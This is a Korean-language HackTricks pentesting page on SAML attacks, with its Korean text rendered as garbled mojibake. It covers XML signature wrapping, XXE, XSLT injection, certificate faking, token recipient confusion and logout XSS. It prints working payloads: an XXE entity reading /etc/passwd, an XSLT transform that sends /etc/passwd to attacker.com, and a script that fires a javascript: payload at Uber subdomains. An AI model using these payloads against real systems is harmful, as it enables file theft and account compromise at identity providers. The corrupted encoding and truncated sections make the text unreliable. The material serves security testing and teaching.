# SAML ê³µê²©

## SAML ê³µê²©

<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì°¸ì—¬í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## ë„êµ¬

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): URL ë˜ëŠ” URL ëª©ë¡ì„ ê°€ì ¸ì™€ SAML ì†Œë¹„ URLì„ ì¶œë ¥í•  ìˆ˜ ìˆëŠ” ë„êµ¬ì…ë‹ˆë‹¤.

## XML ë¼ìš´ë“œíŠ¸ë¦½

XMLì—ì„œ XMLì˜ ì„œëª…ëœ ë¶€ë¶„ì€ ë©”ëª¨ë¦¬ì— ì €ì¥ë˜ì–´ ì¼ë¶€ ì¸ì½”ë”©/ë””ì½”ë”©ì´ ìˆ˜í–‰ë˜ê³  ì„œëª…ì´ í™•ì¸ë©ë‹ˆë‹¤. ì´ìƒì ìœ¼ë¡œ ê·¸ ì¸ì½”ë”©/ë””ì½”ë”©ì€ ë°ì´í„°ë¥¼ ë³€ê²½í•˜ì§€ ì•Šì•„ì•¼ í•˜ì§€ë§Œ ê·¸ ì‹œë‚˜ë¦¬ì˜¤ì— ë”°ë¼ **í™•ì¸ë˜ëŠ” ë°ì´í„°ì™€ ì›ë³¸ ë°ì´í„°ê°€ ë™ì¼í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ì½”ë“œë¥¼ í™•ì¸í•˜ì„¸ìš”:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
í”„ë¡œê·¸ë¨ì„ REXML 3.2.4 ì´í•˜ ë²„ì „ì— ëŒ€í•´ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒ ì¶œë ¥ì´ ë‚˜íƒ€ë‚©ë‹ˆë‹¤:
```
First child in original doc: Y
First child after round-trip: Z
```
ì´ì „ í”„ë¡œê·¸ë¨ì—ì„œ REXMLì´ ì›ë³¸ XML ë¬¸ì„œë¥¼ ë³¸ ë°©ì‹ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

ê·¸ë¦¬ê³  íŒŒì‹± ë° ì§ë ¬í™” ë¼ìš´ë“œ í›„ì— ë³¸ ë°©ì‹ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

ì·¨ì•½ì  ë° ê·¸ê²ƒì„ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML ì„œëª… ë˜í•‘ ê³µê²©

**XML ì„œëª… ë˜í•‘ ê³µê²©(XSW)**ì—ì„œ ê³µê²©ìëŠ” XML ë¬¸ì„œê°€ **ì„œëª… ìœ íš¨ì„± ê²€ì‚¬** ë° **ê¸°ëŠ¥ í˜¸ì¶œ** ë‘ ê°€ì§€ ë‹¤ë¥¸ ë‹¨ê³„ë¥¼ í†µí•´ ì²˜ë¦¬ë  ë•Œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ê³µê²©ì€ XML ë¬¸ì„œ êµ¬ì¡°ë¥¼ ë³€ê²½í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. êµ¬ì²´ì ìœ¼ë¡œ, ê³µê²©ìëŠ” XML ì„œëª…ì˜ ìœ íš¨ì„±ì„ ì €í•´í•˜ì§€ ì•ŠëŠ” **ìœ„ì¡°ëœ ìš”ì†Œë¥¼ ì‚½ì…**í•©ë‹ˆë‹¤. ì´ ì¡°ì‘ì€ **ì‘ìš© í”„ë¡œê·¸ë¨ ë¡œì§**ì— ì˜í•´ ë¶„ì„ë˜ëŠ” ìš”ì†Œì™€ **ì„œëª… ê²€ì¦ ëª¨ë“ˆ**ì— ì˜í•´ í™•ì¸ëœ ìš”ì†Œ ì‚¬ì´ì— ë¶ˆì¼ì¹˜ë¥¼ ë§Œë“¤ê¸° ìœ„í•¨ì…ë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ XML ì„œëª…ì€ ê¸°ìˆ ì ìœ¼ë¡œ ìœ íš¨í•˜ê³  í™•ì¸ì„ í†µê³¼í•˜ì§€ë§Œ, ì‘ìš© í”„ë¡œê·¸ë¨ ë¡œì§ì€ **ìœ„ì¡°ëœ ìš”ì†Œ**ë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ, ê³µê²©ìëŠ” XML ì„œëª…ì˜ **ë¬´ê²°ì„± ë³´í˜¸** ë° **ì›ë³¸ ì¸ì¦**ì„ ìš°íšŒí•˜ì—¬ ê°ì§€ë˜ì§€ ì•Šê³  **ì„ì˜ì˜ ì½˜í…ì¸ ë¥¼ ì‚½ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ê³µê²©ì€ [**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **ë°** [**ì´ ë…¼ë¬¸**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)ì— ê¸°ë°˜í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ìì„¸í•œ ë‚´ìš©ì€ í•´ë‹¹ ìë£Œë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.

### XSW #1

* **ì „ëµ**: ì„œëª…ì´ í¬í•¨ëœ ìƒˆ ë£¨íŠ¸ ìš”ì†Œê°€ ì¶”ê°€ë¨.
* **ì˜í–¥**: ìœ íš¨í•œ "Response -> Assertion -> Subject"ì™€ ê³µê²©ìì˜ "ì•…ì˜ì ì¸ ìƒˆ Response -> Assertion -> Subject" ì‚¬ì´ì— í˜¼ë€ì´ ë°œìƒí•˜ì—¬ ë°ì´í„° ë¬´ê²°ì„± ë¬¸ì œê°€ ë°œìƒí•  ìˆ˜ ìˆìŒ.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **XSW #1ê³¼ì˜ ì°¨ì´ì **: í¬ì¥ ì„œëª… ëŒ€ì‹  ë¶„ë¦¬ëœ ì„œëª…ì„ í™œìš©í•¨.
* **ì˜í–¥**: XSW #1ê³¼ ìœ ì‚¬í•œ "ì•…ì˜ì " êµ¬ì¡°ëŠ” ë¬´ê²°ì„± í™•ì¸ í›„ ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ì„ ì†ì´ê¸° ìœ„í•´ ëª©ì ì„ ë‘ .

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

(ì´í•˜ ìƒëµ)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## ë„êµ¬

Burp í™•ì¥ í”„ë¡œê·¸ë¨ [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ë¥¼ ì‚¬ìš©í•˜ì—¬ SAML ìš”ì²­ì—ì„œ POCë¥¼ ìƒì„±í•˜ì—¬ ê°€ëŠ¥í•œ XXE ì·¨ì•½ì  ë° SAML ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ í† í¬ë„ í™•ì¸í•´ë³´ì„¸ìš”: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAMLì„ í†µí•œ XSLT

XSLTì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

í™•ì¥ ê°€ëŠ¥í•œ ìŠ¤íƒ€ì¼ì‹œíŠ¸ ì–¸ì–´ ë³€í™˜(XSLT)ì€ XML ë¬¸ì„œë¥¼ HTML, JSON ë˜ëŠ” PDFì™€ ê°™ì€ ë‹¤ì–‘í•œ í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **XSLT ë³€í™˜ì€ ë””ì§€í„¸ ì„œëª…ì˜ í™•ì¸ ì „ì— ìˆ˜í–‰**ë©ë‹ˆë‹¤. ì´ëŠ” ìœ íš¨í•œ ì„œëª…ì´ ì—†ì–´ë„ ê³µê²©ì´ ì„±ê³µí•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ìì²´ ì„œëª… ë˜ëŠ” ìœ íš¨í•˜ì§€ ì•Šì€ ì„œëª…ì´ ìˆìœ¼ë©´ ì¶©ë¶„í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì·¨ì•½ì ì„ í™•ì¸í•˜ê¸° ìœ„í•œ **POC**ë¥¼ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ ì„¹ì…˜ì˜ ì²˜ìŒì— ì–¸ê¸‰ëœ hacktricks í˜ì´ì§€ì—ì„œ í˜ì´ë¡œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### ë„êµ¬

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ SAML ìš”ì²­ì—ì„œ POCë¥¼ ìƒì„±í•˜ì—¬ ê°€ëŠ¥í•œ XSLT ì·¨ì•½ì ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ê°•ì—°ë„ í™•ì¸í•´ë³´ì„¸ìš”: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML ì„œëª… ì œì™¸ <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML ì„œëª… ì œì™¸**ëŠ” ì„œëª… ìš”ì†Œê°€ ì—†ì„ ë•Œ SAML êµ¬í˜„ì˜ ë™ì‘ì„ ê´€ì°°í•©ë‹ˆë‹¤. ì´ ìš”ì†Œê°€ ëˆ„ë½ë˜ë©´ **ì„œëª… ìœ íš¨ì„± ê²€ì‚¬ê°€ ë°œìƒí•˜ì§€ ì•Šì„ ìˆ˜** ìˆì–´ ì·¨ì•½í•´ì§‘ë‹ˆë‹¤. ì´ë¥¼ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ì„œëª…ìœ¼ë¡œ í™•ì¸ë˜ëŠ” ë‚´ìš©ì„ ë³€ê²½í•˜ì—¬ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### ë„êµ¬ <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

[SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. SAML ì‘ë‹‘ì„ ê°€ë¡œì±„ê³  `ì„œëª… ì œê±°`ë¥¼ í´ë¦­í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ëª¨ë“ ** ì„œëª… ìš”ì†Œê°€ ì œê±°ë©ë‹ˆë‹¤.

ì„œëª…ì´ ì œê±°ëœ ìƒíƒœì—ì„œ ìš”ì²­ì´ ëŒ€ìƒìœ¼ë¡œ ì§„í–‰ë˜ë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ì„œë¹„ìŠ¤ì—ì„œ ì„œëª…ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê²½ìš°

## ì¸ì¦ì„œ ìœ„ì¡° <a href="#certificate-faking" id="certificate-faking"></a>

ì¸ì¦ì„œ ìœ„ì¡°ëŠ” **ì„œë¹„ìŠ¤ ì œê³µì(SP)ê°€ ì‹ ë¢°í•˜ëŠ” ID ê³µê¸‰ì(IdP)ì— ì˜í•´ ì„œëª…ëœ SAML ë©”ì‹œì§€ë¥¼ ì˜¬ë°”ë¥´ê²Œ í™•ì¸í•˜ëŠ”ì§€** í…ŒìŠ¤íŠ¸í•˜ëŠ” ê¸°ìˆ ì…ë‹ˆë‹¤. ì´ëŠ” **ìì²´ ì„œëª…ëœ ì¸ì¦ì„œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ SAML ì‘ë‹‘ ë˜ëŠ” ì£¼ì¥ì— ì„œëª…í•˜ëŠ” ê²ƒì„ í¬í•¨í•˜ë©°, SPì™€ IdP ê°„ì˜ ì‹ ë¢° ìœ íš¨ì„± ê²€ì‚¬ í”„ë¡œì„¸ìŠ¤ë¥¼ í‰ê°€í•˜ëŠ” ë° ë„ì›€ì´ ë©ë‹ˆë‹¤.

### ì¸ì¦ì„œ ìœ„ì¡° ìˆ˜í–‰ ë°©ë²•

ë‹¤ìŒ ë‹¨ê³„ëŠ” [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp í™•ì¥ í”„ë¡œê·¸ë¨ì„ ì‚¬ìš©í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ë¥¼ ê°œìš”í™”í•œ ê²ƒì…ë‹ˆë‹¤:

1. SAML ì‘ë‹‘ì„ ê°€ë¡œì±•ë‹ˆë‹¤.
2. ì‘ë‹µì— ì„œëª…ì´ í¬í•¨ë˜ì–´ ìˆëŠ” ê²½ìš° `ì¸ì¦ì„œë¥¼ SAML Raider Certsë¡œ ë³´ë‚´ê¸°` ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦ì„œë¥¼ SAML Raider Certsë¡œ ë³´ëƒ…ë‹ˆë‹¤.
3. SAML Raider Certificates íƒ­ì—ì„œ ê°€ì ¸ì˜¨ ì¸ì¦ì„œë¥¼ ì„ íƒí•˜ê³  `ì €ì¥ ë° ìì²´ ì„œëª…`ì„ í´ë¦­í•˜ì—¬ ì›ë³¸ ì¸ì¦ì„œì˜ ìì²´ ì„œëª…ëœ ë³µì œë³¸ì„ ìƒì„±í•©ë‹ˆë‹¤.
4. Burpì˜ Proxyì—ì„œ ê°€ë¡œì±ˆ ìš”ì²­ìœ¼ë¡œ ëŒì•„ê°‘ë‹ˆë‹¤. XML ì„œëª… ë“œë¡­ë‹¤ìš´ì—ì„œ ìƒˆë¡œìš´ ìì²´ ì„œëª…ëœ ì¸ì¦ì„œë¥¼ ì„ íƒí•©ë‹ˆë‹¤.
5. `ì„œëª… ì œê±°` ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ê¸°ì¡´ ì„œëª…ì„ ì œê±°í•©ë‹ˆë‹¤.
6. **`(ë‹¤ì‹œ) ë©”ì‹œì§€ ì„œëª…`** ë˜ëŠ” **`(ë‹¤ì‹œ) ì£¼ì¥ ì„œëª…`** ë²„íŠ¼ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆ ì¸ì¦ì„œë¡œ ë©”ì‹œì§€ ë˜ëŠ” ì£¼ì¥ì— ì„œëª…í•©ë‹ˆë‹¤.
7. ì„œëª…ëœ ë©”ì‹œì§€ë¥¼ ì „ë‹¬í•©ë‹ˆë‹¤. ì„±ê³µì ì¸ ì¸ì¦ì€ SPê°€ ìì²´ ì„œëª…ëœ ì¸ì¦ì„œë¡œ ì„œëª…ëœ ë©”ì‹œì§€ë¥¼ ìˆ˜ë½í•˜ëŠ” ê²ƒì„ ë‚˜íƒ€ë‚´ë©°, SAML ë©”ì‹œì§€ì˜ ìœ íš¨ì„± ê²€ì‚¬ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì ì¬ì ì¸ ì·¨ì•½ì ì„ ë“œëŸ¬ëƒ…ë‹ˆë‹¤.

## í† í° ìˆ˜ë ¹ì í˜¼ë€ / ì„œë¹„ìŠ¤ ì œê³µì ëŒ€ìƒ í˜¼ë€ <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

í† í° ìˆ˜ë ¹ì í˜¼ë€ ë° ì„œë¹„ìŠ¤ ì œê³µì ëŒ€ìƒ í˜¼ë€ì€ **ì„œë¹„ìŠ¤ ì œê³µìê°€ ì‘ë‹µì˜ ì˜ë„ëœ ìˆ˜ë ¹ìë¥¼ ì˜¬ë°”ë¥´ê²Œ í™•ì¸í•˜ëŠ”ì§€** í™•ì¸í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ë³¸ì§ˆì ìœ¼ë¡œ ì„œë¹„ìŠ¤ ì œê³µìëŠ” ë‹¤ë¥¸ ì œê³µìë¥¼ ìœ„í•´ ì‘ë‹µì´ ì˜ë„ëœ ê²½ìš° ì¸ì¦ ì‘ë‹µì„ ê±°ë¶€í•´ì•¼ í•©ë‹ˆë‹¤. ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ìš”ì†ŒëŠ” SAML ì‘ë‹µì˜ **SubjectConfirmationData** ìš”ì†Œ ë‚´ì— ìˆëŠ” **Recipient** í•„ë“œì…ë‹ˆë‹¤. ì´ í•„ë“œëŠ” ì£¼ì¥ì´ ì „ì†¡ë˜ì–´ì•¼ í•˜ëŠ” URLì„ ì§€ì •í•©ë‹ˆë‹¤. ì‹¤ì œ ìˆ˜ë ¹ìê°€ ì˜ë„ëœ ì„œë¹„ìŠ¤ ì œê³µìì™€ ì¼ì¹˜í•˜ì§€ ì•Šìœ¼ë©´ ì£¼ì¥ì€ ì˜ëª»ëœ ê²ƒìœ¼ë¡œ ê°„ì£¼ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

#### **ì‘ë™ ë°©ì‹**

SAML í† í° ìˆ˜ë ¹ì í˜¼ë€(SAML-TRC) ê³µê²©ì´ ê°€ëŠ¥í•˜ë ¤ë©´ íŠ¹ì • ì¡°ê±´ì´ ì¶©ì¡±ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ë¨¼ì € SP-Legitì´ë¼ê³  í•˜ëŠ” ì„œë¹„ìŠ¤ ì œê³µì(SP)ì— ìœ íš¨í•œ ê³„ì •ì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ë‘˜ì§¸, ëŒ€ìƒ ì„œë¹„ìŠ¤ ì œê³µì(SP-Target)ëŠ” SP-Legitì— ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•˜ëŠ” ë™ì¼í•œ ID ê³µê¸‰ìì—ì„œ í† í°ì„ ìˆ˜ë½í•´ì•¼ í•©ë‹ˆë‹¤.

ì´ëŸ¬í•œ ì¡°ê±´ í•˜ì—ì„œ ê³µê²© í”„ë¡œì„¸ìŠ¤ëŠ” ê°„ë‹¨í•©ë‹ˆë‹¤. ê³µìœ  ID ê³µê¸‰ìë¥¼ í†µí•´ SP-Legitê³¼ì˜ ì‹¤ì œ ì„¸ì…˜ì´ ì‹œì‘ë©ë‹ˆë‹¤. ID ê³µê¸‰ìì—ì„œ SP-Legitìœ¼ë¡œì˜ SAML ì‘ë‹µì´ ê°€ë¡œì±„ì§‘ë‹ˆë‹¤. SP-Legitì„ ìœ„í•´ ì›ë˜ ì˜ë„ëœ ì´ ê°€ë¡œì±ˆ SAML ì‘ë‹µì€ SP-Targetìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ë©ë‹ˆë‹¤. ì´ ê³µê²©ì˜ ì„±ê³µì€ SP-Targetì´ ì£¼ì¥ì„ ìˆ˜ë½í•˜ê³  SP-Legitì— ì‚¬ìš©ëœ ë™ì¼í•œ ê³„ì • ì´ë¦„ìœ¼ë¡œ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ì¸¡ì •ë©ë‹ˆë‹¤.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## ë¡œê·¸ì•„ì›ƒ ê¸°ëŠ¥ì—ì„œì˜ XSS

ì›ë³¸ ì—°êµ¬ëŠ” [ì´ ë§í¬](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ë¥¼ í†µí•´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë””ë ‰í„°ë¦¬ ë¸Œë£¨íŠ¸ í¬ì‹± ê³¼ì • ì¤‘ ë¡œê·¸ì•„ì›ƒ í˜ì´ì§€ê°€ ë‹¤ìŒ ìœ„ì¹˜ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
í•´ë‹¹ ë§í¬ì— ì•¡ì„¸ìŠ¤í•˜ë©´ ë‹¤ìŒìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜ì´ ë°œìƒí–ˆìŠµë‹ˆë‹¤:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
ì´ë¡œ ì¸í•´ `base` ë§¤ê°œë³€ìˆ˜ê°€ URLì„ í—ˆìš©í•œë‹¤ëŠ” ê²ƒì´ ë°í˜€ì¡ŒìŠµë‹ˆë‹¤. ì´ì— ë”°ë¼ URLì„ `javascript:alert(123);`ë¡œ ëŒ€ì²´í•˜ì—¬ XSS (Cross-Site Scripting) ê³µê²©ì„ ì‹œë„í•˜ëŠ” ì•„ì´ë””ì–´ê°€ ë‚˜ì™”ìŠµë‹ˆë‹¤.

### ëŒ€ê·œëª¨ ì•…ìš©

[ì´ ì—°êµ¬ì—ì„œ](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

`uberinternal.com`ì˜ í•˜ìœ„ ë„ë©”ì¸ì„ ë¶„ì„í•˜ê¸° ìœ„í•´ [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ë™ì¼í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ë„ë©”ì¸ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤. ì´í›„ `oidauth/prompt` í˜ì´ì§€ë¥¼ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ê°€ ê°œë°œë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë°ì´í„°ë¥¼ ì…ë ¥í•˜ê³  ì¶œë ¥ì— ë°˜ì˜ë˜ëŠ”ì§€ í™•ì¸í•˜ì—¬ XSS (Cross-Site Scripting)ë¥¼ í…ŒìŠ¤íŠ¸í•©ë‹ˆë‹¤. ì…ë ¥ì´ ì‹¤ì œë¡œ ë°˜ì˜ë˜ëŠ” ê²½ìš°, ìŠ¤í¬ë¦½íŠ¸ëŠ” í•´ë‹¹ í˜ì´ì§€ë¥¼ ì·¨ì•½í•˜ë‹¤ê³  í”Œë˜ê·¸ ì²˜ë¦¬í•©ë‹ˆë‹¤.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## ì°¸ê³  ìë£Œ

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

